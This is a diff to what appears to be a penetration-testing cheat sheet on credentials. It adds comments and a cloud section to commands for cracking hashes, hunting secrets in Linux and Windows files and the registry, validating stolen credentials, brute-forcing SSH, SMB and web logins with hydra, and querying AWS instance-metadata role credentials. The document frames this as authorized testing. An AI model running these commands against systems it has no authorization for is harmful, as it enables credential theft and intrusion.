@@ -15,6 +15,7 @@ in a separate file.
 ### Identify hashes
 
 ```bash
+# Identify hash formats using both context and identification tools
 hashid hashes.txt
 hashcat --example-hashes | less
 nth --file hashes.txt
@@ -28,6 +29,7 @@ generic hash identifier.
 ### Common conversions
 
 ```bash
+# Convert protected files into formats accepted by John
 ssh2john id_rsa > id_rsa.hash
 keepass2john Database.kdbx > keepass.hash
 zip2john archive.zip > zip.hash
@@ -40,6 +42,7 @@ bitlocker2john -i disk.img > bitlocker.hash
 ### John and Hashcat
 
 ```bash
+# Try wordlists, rules, masks, and display recovered results
 john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 john --show hashes.txt
 
@@ -68,6 +71,7 @@ Build candidates from evidence such as organization names, seasons, years,
 products, usernames, and passwords already recovered.
 
 ```bash
+# Build a small target-specific candidate list from observed evidence
 cewl -d 2 -m 5 -w web.words "$URL"
 hashcat --stdout base.words -r /usr/share/hashcat/rules/best64.rule > mutated.words
 sort -u web.words mutated.words > candidates.txt
@@ -78,6 +82,7 @@ printf '%s\n' Spring Summer Autumn Winter | sed 's/$/2026!/' >> candidates.txt
 ### Search Linux files
 
 ```bash
+# Search likely Linux application and user locations for secrets
 find /home /opt /var/www -type f \( -name '*.conf' -o -name '*.ini' -o -name '*.env' \
   -o -name '*.xml' -o -name '*.yml' -o -name '*.yaml' \) -readable 2>/dev/null
 
@@ -94,6 +99,7 @@ lines, mounted shares, and application backups.
 ### Search Windows files and registry
 
 ```powershell
+# Search likely Windows files, PowerShell history, and registry values
 Get-ChildItem C:\Users,C:\inetpub,C:\xampp -Recurse -Force -ErrorAction SilentlyContinue |
   Where-Object { $_.Name -match '\.(config|ini|xml|txt|ps1|bat|kdbx)$' }
 
@@ -115,6 +121,7 @@ an entire filesystem produces noise and may be slow.
 ### Validate deliberately
 
 ```bash
+# Validate one recovered credential across justified services
 netexec smb "$IP" -d "$DOMAIN" -u "$USER" -p "$PASS"
 netexec winrm "$IP" -d "$DOMAIN" -u "$USER" -p "$PASS"
 ldapwhoami -x -H "ldap://$IP" -D "$USER@$DOMAIN" -w "$PASS"
@@ -128,6 +135,7 @@ Use online guesses only when the target is authorized, the protocol is known,
 and the candidate set is small enough to avoid uncontrolled lockouts.
 
 ```bash
+# Perform narrowly scoped online checks after confirming lockout risk
 hydra -L users.txt -P candidates.txt -f -V ssh://"$IP"
 hydra -L users.txt -P candidates.txt -f -V smb://"$IP"
 hydra -L users.txt -P candidates.txt "$IP" http-post-form \
@@ -152,3 +160,39 @@ limit attempts, and record which target and protocol validated each credential.
   input format requires it.
 - Use `--username` in Hashcat only for files that actually prefix each hash with
   a username.
+
+## Cloud foothold checks
+
+Cloud CLIs and metadata can explain an application’s identity and reachable
+resources. Query them only when the host and cloud account are inside scope;
+avoid recursively downloading buckets or secrets during initial enumeration.
+
+```bash
+# Identify configured AWS profiles and the active caller without listing data
+find ~/.aws -maxdepth 2 -type f -ls 2>/dev/null
+aws configure list-profiles
+aws sts get-caller-identity --profile default
+
+# Inspect the local AWS role name through IMDSv2
+TOKEN=$(curl -fsS -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 60')
+curl -fsS -H "X-aws-ec2-metadata-token: $TOKEN" 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
+
+# Identify Azure CLI context without changing subscriptions
+az account show
+az account list --output table
+
+# Identify Google Cloud CLI context and active project
+gcloud auth list
+gcloud config list
+```
+
+```powershell
+# Locate common cloud configuration and token-cache directories
+Get-ChildItem $HOME\.aws,$HOME\.azure,$HOME\AppData\Roaming\gcloud -Force -ErrorAction SilentlyContinue
+
+# Inspect environment variable names while redacting their values
+Get-ChildItem Env: | Where-Object Name -Match 'AWS|AZURE|GOOGLE|GCP' | Select-Object Name
+```
+
+Record account/tenant, principal, region, project/subscription, credential
+source, expiry, and allowed action. A valid token is not proof of broad access.
